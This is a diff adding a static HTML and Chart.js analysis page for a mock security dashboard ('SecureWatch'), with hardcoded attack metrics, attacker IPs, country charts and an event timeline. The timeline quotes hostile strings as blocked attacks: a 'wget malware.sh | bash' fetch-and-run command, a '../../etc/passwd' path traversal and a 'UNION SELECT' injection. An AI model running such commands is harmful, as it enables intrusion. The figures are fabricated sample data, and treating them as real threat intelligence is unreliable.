@@ -1,0 +1,718 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Analysis — SecureWatch</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.1/chart.umd.min.js"></script>
+  <style>
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+
+    body{
+      font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+      background:#0f1117;
+      color:#e2e8f0;
+      min-height:100vh;
+    }
+
+    /* ── NAV ── */
+    nav{
+      display:flex;align-items:center;
+      padding:0 24px;
+      background:#16192a;
+      border-bottom:1px solid #2d3148;
+      height:52px;
+    }
+    .nav-brand{
+      font-size:15px;font-weight:700;color:#f1f5f9;
+      letter-spacing:-0.02em;margin-right:32px;
+      display:flex;align-items:center;gap:8px;
+    }
+    .nav-brand .shield{
+      width:22px;height:22px;background:#4f6dff;border-radius:5px;
+      display:flex;align-items:center;justify-content:center;font-size:12px;
+    }
+    .nav-links{display:flex;gap:2px;}
+    .nav-link{
+      font-size:13px;color:#64748b;text-decoration:none;
+      padding:6px 14px;border-radius:6px;
+      transition:background 0.15s,color 0.15s;
+    }
+    .nav-link:hover{background:#252840;color:#cbd5e1;}
+    .nav-link.active{background:#252840;color:#f1f5f9;}
+    .nav-right{margin-left:auto;display:flex;align-items:center;gap:10px;}
+    .live-badge{
+      display:inline-flex;align-items:center;gap:5px;
+      font-size:11px;color:#4ade80;
+      background:#0f2a1a;border:1px solid #14532d;
+      border-radius:99px;padding:3px 10px;
+    }
+    .live-dot{
+      width:6px;height:6px;border-radius:50%;background:#4ade80;
+      animation:pulse 1.5s infinite;
+    }
+    @keyframes pulse{0%,100%{opacity:1;transform:scale(1);}50%{opacity:0.4;transform:scale(0.8);}}
+
+    /* ── PAGE ── */
+    .page{padding:24px;}
+    .page-header{
+      display:flex;align-items:flex-end;justify-content:space-between;
+      margin-bottom:22px;flex-wrap:wrap;gap:12px;
+    }
+    h1{font-size:22px;font-weight:600;color:#f1f5f9;}
+    .subtitle{font-size:13px;color:#64748b;margin-top:3px;}
+
+    .range-tabs{display:flex;gap:4px;}
+    .range-tab{
+      font-size:12px;padding:5px 12px;
+      border:1px solid #2d3148;border-radius:6px;
+      background:transparent;color:#64748b;cursor:pointer;
+      transition:background 0.15s,color 0.15s;
+    }
+    .range-tab:hover{background:#252840;color:#cbd5e1;}
+    .range-tab.active{background:#4f6dff;border-color:#4f6dff;color:#fff;}
+
+    /* ── METRICS ── */
+    .metrics{
+      display:grid;
+      grid-template-columns:repeat(auto-fit,minmax(140px,1fr));
+      gap:12px;margin-bottom:22px;
+    }
+    .metric{
+      background:#1e2130;border:1px solid #2d3148;
+      border-radius:10px;padding:14px 16px;
+    }
+    .metric-label{
+      font-size:11px;color:#64748b;
+      text-transform:uppercase;letter-spacing:0.05em;margin-bottom:6px;
+    }
+    .metric-value{font-size:26px;font-weight:700;}
+    .metric-delta{font-size:11px;margin-top:4px;}
+    .delta-up{color:#f87171;} .delta-down{color:#4ade80;}
+    .mv-red{color:#f87171;} .mv-amber{color:#fbbf24;}
+    .mv-blue{color:#60a5fa;} .mv-green{color:#4ade80;}
+    .mv-purple{color:#a78bfa;} .mv-pink{color:#f472b6;}
+
+    /* ── GRID ── */
+    .grid-2{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:16px;}
+    .grid-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:16px;margin-bottom:16px;}
+    .grid-13{display:grid;grid-template-columns:1fr 2fr;gap:16px;margin-bottom:16px;}
+    .grid-31{display:grid;grid-template-columns:2fr 1fr;gap:16px;margin-bottom:16px;}
+    @media(max-width:900px){
+      .grid-2,.grid-3,.grid-13,.grid-31{grid-template-columns:1fr;}
+    }
+
+    /* ── CARD ── */
+    .card{
+      background:#1e2130;border:1px solid #2d3148;
+      border-radius:12px;padding:18px;
+    }
+    .card-title{
+      font-size:12px;font-weight:600;color:#64748b;
+      text-transform:uppercase;letter-spacing:0.05em;
+      margin-bottom:16px;display:flex;align-items:center;justify-content:space-between;
+    }
+    .card-title span{font-size:11px;color:#475569;text-transform:none;letter-spacing:0;font-weight:400;}
+
+    /* ── CHART CANVAS ── */
+    .chart-wrap{position:relative;}
+    .chart-wrap canvas{width:100%!important;}
+
+    /* ── BADGE ── */
+    .badge{
+      display:inline-block;font-size:11px;font-weight:600;
+      padding:3px 9px;border-radius:99px;
+    }
+    .th-critical{background:#3b1212;color:#f87171;border:1px solid #7f1d1d;}
+    .th-high    {background:#3b1f0d;color:#fb923c;border:1px solid #7c2d12;}
+    .th-medium  {background:#332b00;color:#fbbf24;border:1px solid #713f12;}
+    .th-low     {background:#0f2a1a;color:#4ade80;border:1px solid #14532d;}
+    .th-none    {background:#1a1d2e;color:#94a3b8;border:1px solid #334155;}
+
+    .at-sqli {background:#3b1212;color:#fca5a5;border:1px solid #7f1d1d;}
+    .at-xss  {background:#332b00;color:#fde68a;border:1px solid #713f12;}
+    .at-ddos {background:#0d1f3b;color:#93c5fd;border:1px solid #1e3a6e;}
+    .at-brute{background:#2a1630;color:#d8b4fe;border:1px solid #6b21a8;}
+    .at-rce  {background:#3b0d24;color:#f9a8d4;border:1px solid #831843;}
+    .at-recon{background:#1a1d2e;color:#94a3b8;border:1px solid #334155;}
+
+    /* ── TABLE ── */
+    .mini-table{width:100%;border-collapse:collapse;font-size:12px;}
+    .mini-table th{
+      padding:8px 10px;text-align:left;
+      font-size:10px;font-weight:600;color:#475569;
+      text-transform:uppercase;letter-spacing:0.05em;
+      border-bottom:1px solid #2d3148;
+    }
+    .mini-table td{
+      padding:8px 10px;border-bottom:1px solid #1a1d2e;
+      vertical-align:middle;color:#cbd5e1;
+    }
+    .mini-table tr:last-child td{border-bottom:none;}
+    .mini-table tr:hover td{background:#252840;}
+    .mono{font-family:'Courier New',monospace;font-size:11px;}
+
+    /* ── BAR ROW ── */
+    .bar-row{display:flex;align-items:center;gap:10px;margin-bottom:12px;}
+    .bar-label{font-size:12px;color:#94a3b8;min-width:90px;white-space:nowrap;}
+    .bar-bg{flex:1;height:6px;background:#2d3148;border-radius:99px;overflow:hidden;}
+    .bar-fill{height:100%;border-radius:99px;transition:width 0.5s;}
+    .bar-val{font-size:11px;color:#64748b;min-width:36px;text-align:right;}
+
+    /* ── HEATMAP ── */
+    .heatmap-grid{
+      display:grid;
+      grid-template-columns:40px repeat(24,1fr);
+      gap:3px;font-size:10px;
+    }
+    .hm-label{
+      display:flex;align-items:center;justify-content:flex-end;
+      padding-right:6px;color:#475569;font-size:10px;
+    }
+    .hm-cell{
+      height:16px;border-radius:3px;
+      transition:opacity 0.2s;cursor:default;
+    }
+    .hm-cell:hover{opacity:0.8;}
+    .hm-hour{
+      text-align:center;color:#475569;font-size:9px;
+      padding-bottom:4px;display:flex;align-items:flex-end;justify-content:center;
+    }
+
+    /* ── RISK SCORE ── */
+    .risk-ring-wrap{display:flex;flex-direction:column;align-items:center;padding:8px 0 16px;}
+    .risk-label-big{font-size:36px;font-weight:700;margin-top:8px;}
+    .risk-sublabel{font-size:12px;color:#64748b;margin-top:2px;}
+    .risk-breakdown{margin-top:16px;width:100%;}
+    .risk-item{display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;font-size:12px;}
+    .risk-item-label{color:#94a3b8;}
+    .risk-item-bar{flex:1;height:5px;background:#2d3148;border-radius:99px;margin:0 10px;overflow:hidden;}
+    .risk-item-fill{height:100%;border-radius:99px;}
+    .risk-item-val{color:#64748b;min-width:30px;text-align:right;}
+
+    /* ── TIMELINE ── */
+    .timeline{display:flex;flex-direction:column;gap:0;}
+    .tl-item{display:flex;gap:12px;padding:0 0 14px;}
+    .tl-left{display:flex;flex-direction:column;align-items:center;width:28px;flex-shrink:0;}
+    .tl-dot{width:10px;height:10px;border-radius:50%;flex-shrink:0;margin-top:3px;}
+    .tl-line{flex:1;width:1px;background:#2d3148;margin-top:4px;}
+    .tl-item:last-child .tl-line{display:none;}
+    .tl-content{}
+    .tl-time{font-size:10px;color:#475569;font-family:monospace;margin-bottom:2px;}
+    .tl-msg{font-size:12px;color:#94a3b8;line-height:1.5;}
+    .tl-msg strong{color:#e2e8f0;}
+
+    /* ── INSIGHT CARD ── */
+    .insight{
+      display:flex;gap:12px;
+      background:#16192a;border:1px solid #2d3148;
+      border-radius:8px;padding:12px 14px;margin-bottom:10px;
+    }
+    .insight-icon{font-size:18px;flex-shrink:0;margin-top:1px;}
+    .insight-title{font-size:13px;font-weight:500;color:#f1f5f9;margin-bottom:2px;}
+    .insight-body{font-size:12px;color:#64748b;line-height:1.5;}
+    .insight.danger{border-left:3px solid #7f1d1d;}
+    .insight.warning{border-left:3px solid #713f12;}
+    .insight.info{border-left:3px solid #1e3a6e;}
+    .insight.success{border-left:3px solid #14532d;}
+  </style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav>
+  <div class="nav-brand">
+    <div class="shield">🛡</div>
+    SecureWatch
+  </div>
+  <div class="nav-links">
+    <a href="ip_monitor.html"  class="nav-link">IP Monitor</a>
+    <a href="attack_logs.html" class="nav-link">Attack Logs</a>
+    <a href="firewall.html"    class="nav-link">Firewall</a>
+    <a href="analysis.html"    class="nav-link active">Analysis</a>
+    <a href="reports.html"     class="nav-link">Reports</a>
+    <a href="settings.html"    class="nav-link">Settings</a>
+  </div>
+  <div class="nav-right">
+    <div class="live-badge"><div class="live-dot"></div> Live</div>
+  </div>
+</nav>
+
+<!-- PAGE -->
+<div class="page">
+
+  <!-- Header -->
+  <div class="page-header">
+    <div>
+      <h1>Analysis</h1>
+      <div class="subtitle">Threat intelligence, traffic patterns & security insights</div>
+    </div>
+    <div class="range-tabs">
+      <button class="range-tab" onclick="setRange(this,'1h')">1H</button>
+      <button class="range-tab active" onclick="setRange(this,'24h')">24H</button>
+      <button class="range-tab" onclick="setRange(this,'7d')">7D</button>
+      <button class="range-tab" onclick="setRange(this,'30d')">30D</button>
+    </div>
+  </div>
+
+  <!-- Metrics -->
+  <div class="metrics">
+    <div class="metric">
+      <div class="metric-label">Total attacks</div>
+      <div class="metric-value mv-red" id="m-attacks">2,847</div>
+      <div class="metric-delta delta-up" id="m-attacks-d">↑ 18% vs yesterday</div>
+    </div>
+    <div class="metric">
+      <div class="metric-label">Blocked</div>
+      <div class="metric-value mv-red" id="m-blocked">2,614</div>
+      <div class="metric-delta delta-down">↓ block rate 91.8%</div>
+    </div>
+    <div class="metric">
+      <div class="metric-label">Unique IPs</div>
+      <div class="metric-value mv-blue" id="m-ips">384</div>
+      <div class="metric-delta delta-up">↑ 23 new sources</div>
+    </div>
+    <div class="metric">
+      <div class="metric-label">Avg response</div>
+      <div class="metric-value mv-green" id="m-resp">14ms</div>
+      <div class="metric-delta delta-down">↓ 3ms faster</div>
+    </div>
+    <div class="metric">
+      <div class="metric-label">Critical events</div>
+      <div class="metric-value mv-red" id="m-crit">47</div>
+      <div class="metric-delta delta-up">↑ 12 since 6h ago</div>
+    </div>
+    <div class="metric">
+      <div class="metric-label">Risk score</div>
+      <div class="metric-value mv-amber" id="m-risk">74</div>
+      <div class="metric-delta delta-up">↑ High risk</div>
+    </div>
+  </div>
+
+  <!-- Row 1: Attack timeline + Attack type breakdown -->
+  <div class="grid-31">
+    <div class="card">
+      <div class="card-title">Attack volume over time <span id="timeline-label">last 24 hours</span></div>
+      <div class="chart-wrap" style="height:200px;">
+        <canvas id="chart-timeline"></canvas>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-title">Attack types <span>by count</span></div>
+      <div class="chart-wrap" style="height:200px;">
+        <canvas id="chart-types"></canvas>
+      </div>
+    </div>
+  </div>
+
+  <!-- Row 2: Risk score + Top IPs + Geo -->
+  <div class="grid-3">
+
+    <!-- Risk score -->
+    <div class="card">
+      <div class="card-title">Risk score</div>
+      <div class="risk-ring-wrap">
+        <canvas id="chart-risk" width="140" height="140" style="width:140px;height:140px;"></canvas>
+        <div class="risk-label-big mv-amber">74</div>
+        <div class="risk-sublabel">High risk — action needed</div>
+      </div>
+      <div class="risk-breakdown">
+        <div class="risk-item">
+          <span class="risk-item-label">Attack frequency</span>
+          <div class="risk-item-bar"><div class="risk-item-fill" style="width:88%;background:#f87171;"></div></div>
+          <span class="risk-item-val">88</span>
+        </div>
+        <div class="risk-item">
+          <span class="risk-item-label">Threat severity</span>
+          <div class="risk-item-bar"><div class="risk-item-fill" style="width:74%;background:#fb923c;"></div></div>
+          <span class="risk-item-val">74</span>
+        </div>
+        <div class="risk-item">
+          <span class="risk-item-label">Unique sources</span>
+          <div class="risk-item-bar"><div class="risk-item-fill" style="width:61%;background:#fbbf24;"></div></div>
+          <span class="risk-item-val">61</span>
+        </div>
+        <div class="risk-item">
+          <span class="risk-item-label">Block rate</span>
+          <div class="risk-item-bar"><div class="risk-item-fill" style="width:92%;background:#4ade80;"></div></div>
+          <span class="risk-item-val">92</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Top attacker IPs -->
+    <div class="card">
+      <div class="card-title">Top attacker IPs <span>by blocked reqs</span></div>
+      <table class="mini-table">
+        <thead>
+          <tr><th>IP</th><th>Country</th><th>Type</th><th>Reqs</th></tr>
+        </thead>
+        <tbody>
+          <tr><td class="mono">31.13.90.44</td><td>🇨🇳 CN</td><td><span class="badge at-ddos">DDoS</span></td><td class="mono" style="color:#f87171">210k</td></tr>
+          <tr><td class="mono">194.165.16.11</td><td>🇮🇷 IR</td><td><span class="badge at-ddos">DDoS</span></td><td class="mono" style="color:#f87171">209k</td></tr>
+          <tr><td class="mono">45.14.48.200</td><td>🇧🇷 BR</td><td><span class="badge at-ddos">DDoS</span></td><td class="mono" style="color:#fb923c">40k</td></tr>
+          <tr><td class="mono">185.220.101.47</td><td>🇷🇺 RU</td><td><span class="badge at-brute">Brute</span></td><td class="mono" style="color:#fb923c">15k</td></tr>
+          <tr><td class="mono">45.142.212.18</td><td>🇨🇳 CN</td><td><span class="badge at-sqli">SQLi</span></td><td class="mono" style="color:#fbbf24">9.8k</td></tr>
+          <tr><td class="mono">185.220.102.8</td><td>🇳🇱 NL</td><td><span class="badge at-brute">Brute</span></td><td class="mono" style="color:#fbbf24">5.6k</td></tr>
+          <tr><td class="mono">212.119.34.100</td><td>🇷🇴 RO</td><td><span class="badge at-sqli">SQLi</span></td><td class="mono" style="color:#94a3b8">2.1k</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <!-- Geo distribution -->
+    <div class="card">
+      <div class="card-title">Source countries <span>by attack count</span></div>
+      <div id="geo-bars"></div>
+    </div>
+
+  </div>
+
+  <!-- Row 3: Heatmap -->
+  <div class="card" style="margin-bottom:16px;">
+    <div class="card-title">Attack heatmap <span>day × hour — darker = more attacks</span></div>
+    <div id="heatmap" style="overflow-x:auto;"></div>
+  </div>
+
+  <!-- Row 4: Severity trend + Target endpoints -->
+  <div class="grid-2">
+    <div class="card">
+      <div class="card-title">Severity breakdown over time <span>stacked</span></div>
+      <div class="chart-wrap" style="height:200px;">
+        <canvas id="chart-severity"></canvas>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-title">Most targeted endpoints</div>
+      <div id="endpoint-bars"></div>
+    </div>
+  </div>
+
+  <!-- Row 5: Status distribution + Protocol -->
+  <div class="grid-13" style="margin-top:16px;">
+    <div class="card">
+      <div class="card-title">Security insights</div>
+      <div class="insight danger">
+        <div class="insight-icon">🚨</div>
+        <div>
+          <div class="insight-title">DDoS spike detected</div>
+          <div class="insight-body">Two IPs from CN and IR generated 419k combined requests in the last hour. Auto-block is active but bandwidth saturation risk is elevated.</div>
+        </div>
+      </div>
+      <div class="insight warning">
+        <div class="insight-icon">⚠️</div>
+        <div>
+          <div class="insight-title">Brute force campaign ongoing</div>
+          <div class="insight-body">4 IPs from RU and NL are rotating through /login and /wp-admin endpoints. Recommend enabling CAPTCHA and rate limiting.</div>
+        </div>
+      </div>
+      <div class="insight info">
+        <div class="insight-icon">🔍</div>
+        <div>
+          <div class="insight-title">New attacker subnet identified</div>
+          <div class="insight-body">185.220.101.0/24 has generated 23 distinct attack events today. Consider blocking the entire CIDR range.</div>
+        </div>
+      </div>
+      <div class="insight success">
+        <div class="insight-icon">✅</div>
+        <div>
+          <div class="insight-title">Block rate holding strong</div>
+          <div class="insight-body">91.8% of all malicious requests were blocked automatically. No confirmed breaches in the last 24 hours.</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Recent critical events</div>
+      <div class="timeline">
+        <div class="tl-item">
+          <div class="tl-left"><div class="tl-dot" style="background:#f87171;box-shadow:0 0 6px #f87171aa;"></div><div class="tl-line"></div></div>
+          <div class="tl-content"><div class="tl-time">09:38:50</div><div class="tl-msg"><strong>RCE attempt</strong> — 5.34.180.195 tried to execute <code style="font-size:10px;color:#a78bfa;">wget malware.sh | bash</code> on /shell.php. Blocked.</div></div>
+        </div>
+        <div class="tl-item">
+          <div class="tl-left"><div class="tl-dot" style="background:#f87171;box-shadow:0 0 6px #f87171aa;"></div><div class="tl-line"></div></div>
+          <div class="tl-content"><div class="tl-time">09:36:27</div><div class="tl-msg"><strong>DDoS flood</strong> — 31.13.90.44 (CN) launched HTTP flood at 210k req/s. Auto-blocked, bandwidth spike to 9.8Gbps.</div></div>
+        </div>
+        <div class="tl-item">
+          <div class="tl-left"><div class="tl-dot" style="background:#f87171;box-shadow:0 0 6px #f87171aa;"></div><div class="tl-line"></div></div>
+          <div class="tl-content"><div class="tl-time">09:25:37</div><div class="tl-msg"><strong>Path traversal</strong> — 79.137.192.9 (PL) attempted <code style="font-size:10px;color:#a78bfa;">../../etc/passwd</code> on /admin/config. Blocked.</div></div>
+        </div>
+        <div class="tl-item">
+          <div class="tl-left"><div class="tl-dot" style="background:#fb923c;box-shadow:0 0 6px #fb923caa;"></div><div class="tl-line"></div></div>
+          <div class="tl-content"><div class="tl-time">09:17:04</div><div class="tl-msg"><strong>SQL Injection</strong> — 62.210.115.8 (FR) sent <code style="font-size:10px;color:#a78bfa;">UNION SELECT</code> on /api/orders. Blocked.</div></div>
+        </div>
+        <div class="tl-item">
+          <div class="tl-left"><div class="tl-dot" style="background:#fbbf24;box-shadow:0 0 6px #fbbf24aa;"></div><div class="tl-line"></div></div>
+          <div class="tl-content"><div class="tl-time">09:10:22</div><div class="tl-msg"><strong>Recon scan</strong> — 104.248.232.55 (US) ran full Nmap scan across all ports. Flagged & watching.</div></div>
+        </div>
+        <div class="tl-item">
+          <div class="tl-left"><div class="tl-dot" style="background:#fbbf24;box-shadow:0 0 6px #fbbf24aa;"></div><div class="tl-line"></div></div>
+          <div class="tl-content"><div class="tl-time">09:07:03</div><div class="tl-msg"><strong>SYN flood</strong> — 194.165.16.11 (IR) initiated SYN flood at 92k req/s. Auto-blocked at edge.</div></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</div><!-- /page -->
+
+<script>
+/* ── CHART DEFAULTS ── */
+Chart.defaults.color='#64748b';
+Chart.defaults.font.family="-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif";
+Chart.defaults.font.size=11;
+
+const GRID = {color:'#1e2130',drawBorder:false};
+const NO_LEGEND = {display:false};
+
+/* ── RANGE DATA ── */
+const RANGE_DATA = {
+  '1h':{
+    labels:['50m','45m','40m','35m','30m','25m','20m','15m','10m','5m','now'],
+    attacks:[12,18,9,24,31,19,42,28,15,38,22],
+    label:'last hour'
+  },
+  '24h':{
+    labels:['00','01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23'],
+    attacks:[42,28,19,15,12,9,24,38,112,187,210,198,175,162,189,201,234,218,196,172,158,143,121,98],
+    label:'last 24 hours'
+  },
+  '7d':{
+    labels:['Mon','Tue','Wed','Thu','Fri','Sat','Sun'],
+    attacks:[980,1240,870,1580,2100,1420,2847],
+    label:'last 7 days'
+  },
+  '30d':{
+    labels:['W1','W2','W3','W4'],
+    attacks:[8200,11400,9800,14200],
+    label:'last 30 days'
+  }
+};
+
+let activeRange='24h';
+let timelineChart, severityChart;
+
+function setRange(el, range){
+  document.querySelectorAll('.range-tab').forEach(b=>b.classList.remove('active'));
+  el.classList.add('active');
+  activeRange=range;
+  updateTimeline();
+}
+
+/* ── TIMELINE CHART ── */
+function buildTimeline(){
+  const d=RANGE_DATA[activeRange];
+  const ctx=document.getElementById('chart-timeline').getContext('2d');
+  const grad=ctx.createLinearGradient(0,0,0,200);
+  grad.addColorStop(0,'rgba(79,109,255,0.3)');
+  grad.addColorStop(1,'rgba(79,109,255,0)');
+  timelineChart=new Chart(ctx,{
+    type:'line',
+    data:{
+      labels:d.labels,
+      datasets:[{
+        label:'Attacks',
+        data:d.attacks,
+        borderColor:'#4f6dff',
+        backgroundColor:grad,
+        borderWidth:2,
+        pointRadius:2,
+        pointHoverRadius:5,
+        pointBackgroundColor:'#4f6dff',
+        fill:true,
+        tension:0.4
+      }]
+    },
+    options:{
+      responsive:true,maintainAspectRatio:false,
+      plugins:{legend:NO_LEGEND,tooltip:{backgroundColor:'#1e2130',borderColor:'#2d3148',borderWidth:1,titleColor:'#f1f5f9',bodyColor:'#94a3b8',padding:10}},
+      scales:{
+        x:{grid:GRID,ticks:{color:'#475569',maxTicksLimit:12}},
+        y:{grid:GRID,ticks:{color:'#475569'},beginAtZero:true}
+      }
+    }
+  });
+}
+
+function updateTimeline(){
+  const d=RANGE_DATA[activeRange];
+  document.getElementById('timeline-label').textContent=d.label;
+  timelineChart.data.labels=d.labels;
+  timelineChart.data.datasets[0].data=d.attacks;
+  timelineChart.update();
+}
+
+/* ── ATTACK TYPES DOUGHNUT ── */
+function buildTypes(){
+  const ctx=document.getElementById('chart-types').getContext('2d');
+  new Chart(ctx,{
+    type:'doughnut',
+    data:{
+      labels:['DDoS','Brute Force','SQLi','XSS','RCE','Recon'],
+      datasets:[{
+        data:[419,280,198,124,47,32],
+        backgroundColor:['#1e3a6e','#6b21a8','#7f1d1d','#713f12','#831843','#334155'],
+        borderColor:['#2d5aa0','#9333ea','#ef4444','#f59e0b','#ec4899','#64748b'],
+        borderWidth:1,
+        hoverOffset:6
+      }]
+    },
+    options:{
+      responsive:true,maintainAspectRatio:false,
+      cutout:'65%',
+      plugins:{
+        legend:{
+          position:'right',
+          labels:{color:'#94a3b8',padding:12,font:{size:11},boxWidth:10,boxHeight:10}
+        },
+        tooltip:{backgroundColor:'#1e2130',borderColor:'#2d3148',borderWidth:1,titleColor:'#f1f5f9',bodyColor:'#94a3b8',padding:10}
+      }
+    }
+  });
+}
+
+/* ── RISK GAUGE ── */
+function buildRisk(){
+  const ctx=document.getElementById('chart-risk').getContext('2d');
+  const score=74;
+  new Chart(ctx,{
+    type:'doughnut',
+    data:{
+      datasets:[{
+        data:[score,100-score],
+        backgroundColor:['#fbbf24','#1e2130'],
+        borderWidth:0,
+        hoverOffset:0
+      }]
+    },
+    options:{
+      responsive:false,
+      cutout:'78%',
+      rotation:-90,
+      circumference:180,
+      plugins:{legend:{display:false},tooltip:{enabled:false}}
+    }
+  });
+}
+
+/* ── SEVERITY STACKED ── */
+function buildSeverity(){
+  const ctx=document.getElementById('chart-severity').getContext('2d');
+  const labels=['00','02','04','06','08','10','12','14','16','18','20','22'];
+  severityChart=new Chart(ctx,{
+    type:'bar',
+    data:{
+      labels,
+      datasets:[
+        {label:'Critical',data:[2,1,0,0,4,18,22,19,28,21,14,8],backgroundColor:'#7f1d1d',stack:'s'},
+        {label:'High',    data:[5,3,2,1,8,32,40,38,45,39,28,19],backgroundColor:'#7c2d12',stack:'s'},
+        {label:'Medium',  data:[8,6,4,3,14,48,62,55,70,58,44,31],backgroundColor:'#713f12',stack:'s'},
+        {label:'Low',     data:[12,9,7,5,22,70,90,80,95,82,65,42],backgroundColor:'#14532d',stack:'s'},
+      ]
+    },
+    options:{
+      responsive:true,maintainAspectRatio:false,
+      plugins:{
+        legend:{position:'bottom',labels:{color:'#94a3b8',boxWidth:10,boxHeight:10,padding:10,font:{size:10}}},
+        tooltip:{backgroundColor:'#1e2130',borderColor:'#2d3148',borderWidth:1,titleColor:'#f1f5f9',bodyColor:'#94a3b8',padding:10}
+      },
+      scales:{
+        x:{grid:GRID,ticks:{color:'#475569'}},
+        y:{grid:GRID,ticks:{color:'#475569'},stacked:true,beginAtZero:true}
+      }
+    }
+  });
+}
+
+/* ── GEO BARS ── */
+const GEO=[
+  {flag:'🇷🇺',country:'Russia',    count:312,color:'#4f6dff'},
+  {flag:'🇨🇳',country:'China',     count:298,color:'#4f6dff'},
+  {flag:'🇮🇷',country:'Iran',      count:187,color:'#4f6dff'},
+  {flag:'🇧🇷',country:'Brazil',    count:124,color:'#4f6dff'},
+  {flag:'🇺🇦',country:'Ukraine',   count:98, color:'#4f6dff'},
+  {flag:'🇩🇪',country:'Germany',   count:87, color:'#4f6dff'},
+  {flag:'🇺🇸',country:'USA',       count:72, color:'#4f6dff'},
+  {flag:'🇵🇱',country:'Poland',    count:48, color:'#4f6dff'},
+];
+
+function buildGeo(){
+  const max=GEO[0].count;
+  document.getElementById('geo-bars').innerHTML=GEO.map(g=>`
+    <div class="bar-row">
+      <div class="bar-label">${g.flag} ${g.country}</div>
+      <div class="bar-bg"><div class="bar-fill" style="width:${Math.round(g.count/max*100)}%;background:${g.color};"></div></div>
+      <div class="bar-val">${g.count}</div>
+    </div>
+  `).join('');
+}
+
+/* ── ENDPOINT BARS ── */
+const ENDPOINTS=[
+  {ep:'/login',        count:842,color:'#f87171'},
+  {ep:'/api/users',    count:614,color:'#fb923c'},
+  {ep:'/',             count:487,color:'#fbbf24'},
+  {ep:'/admin',        count:312,color:'#fbbf24'},
+  {ep:'/api/orders',   count:198,color:'#60a5fa'},
+  {ep:'/upload',       count:124,color:'#60a5fa'},
+  {ep:'/wp-admin',     count:98, color:'#94a3b8'},
+  {ep:'/search',       count:72, color:'#94a3b8'},
+];
+
+function buildEndpoints(){
+  const max=ENDPOINTS[0].count;
+  document.getElementById('endpoint-bars').innerHTML=ENDPOINTS.map(e=>`
+    <div class="bar-row">
+      <div class="bar-label mono" style="font-size:11px;color:#94a3b8;">${e.ep}</div>
+      <div class="bar-bg"><div class="bar-fill" style="width:${Math.round(e.count/max*100)}%;background:${e.color};"></div></div>
+      <div class="bar-val">${e.count}</div>
+    </div>
+  `).join('');
+}
+
+/* ── HEATMAP ── */
+function buildHeatmap(){
+  const days=['Mon','Tue','Wed','Thu','Fri','Sat','Sun'];
+  const hours=Array.from({length:24},(_,i)=>i);
+
+  const raw=days.map(()=>hours.map(()=>Math.floor(Math.random()*180)));
+  raw[4][9]=210; raw[4][10]=198; raw[6][9]=187; raw[6][10]=210;
+  raw[0][2]=8; raw[1][3]=6; raw[5][4]=4;
+
+  const maxVal=Math.max(...raw.flat());
+
+  function cellColor(v){
+    const t=v/maxVal;
+    if(t===0) return '#16192a';
+    if(t<0.2) return '#14532d';
+    if(t<0.4) return '#166534';
+    if(t<0.6) return '#713f12';
+    if(t<0.8) return '#7f1d1d';
+    return '#991b1b';
+  }
+
+  let html='<div class="heatmap-grid">';
+  html+='<div class="hm-label"></div>';
+  hours.forEach(h=>{
+    html+=`<div class="hm-hour">${h%6===0?h:''}</div>`;
+  });
+  days.forEach((day,di)=>{
+    html+=`<div class="hm-label">${day}</div>`;
+    hours.forEach((_,hi)=>{
+      const v=raw[di][hi];
+      html+=`<div class="hm-cell" style="background:${cellColor(v)};" title="${day} ${hi}:00 — ${v} attacks"></div>`;
+    });
+  });
+  html+='</div>';
+  document.getElementById('heatmap').innerHTML=html;
+}
+
+/* ── INIT ── */
+buildTimeline();
+buildTypes();
+buildRisk();
+buildSeverity();
+buildGeo();
+buildEndpoints();
+buildHeatmap();
+</script>
+</body>
+</html>
